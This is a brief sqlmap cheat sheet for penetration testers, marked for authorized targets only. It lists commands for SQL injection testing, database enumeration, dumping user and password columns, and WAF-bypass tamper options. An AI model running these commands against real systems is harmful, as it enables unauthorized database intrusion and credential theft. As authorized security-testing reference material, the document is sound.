# SQLMap Essentials (authorized targets only)

```bash
sqlmap -u "http://<host>/page.php?id=1" --batch
sqlmap -u "http://<host>/page.php" --data="id=1" --batch          # POST
sqlmap -r request.txt --batch                                     # from Burp request
sqlmap -u "<url>" -p id                                           # test one param
sqlmap -u "<url>" --cookie="PHPSESSID=..."
sqlmap -u "<url>" --level=3 --risk=2
```

## Enumeration
```bash
sqlmap -u "<url>" --dbs
sqlmap -u "<url>" -D <db> --tables
sqlmap -u "<url>" -D <db> -T <table> --columns
sqlmap -u "<url>" -D <db> -T <table> -C user,pass --dump
sqlmap -u "<url>" --current-user --current-db --is-dba
```

## Options worth remembering
```text
--technique=BEUSTQ   which techniques     --tamper=<script>  WAF bypass scripts
--random-agent       random UA            --proxy=http://127.0.0.1:8080
--csrf-token=<name>  handle anti-CSRF     --flush-session    reset cached results
```
Always confirm scope & written authorization before running automated injection tools.
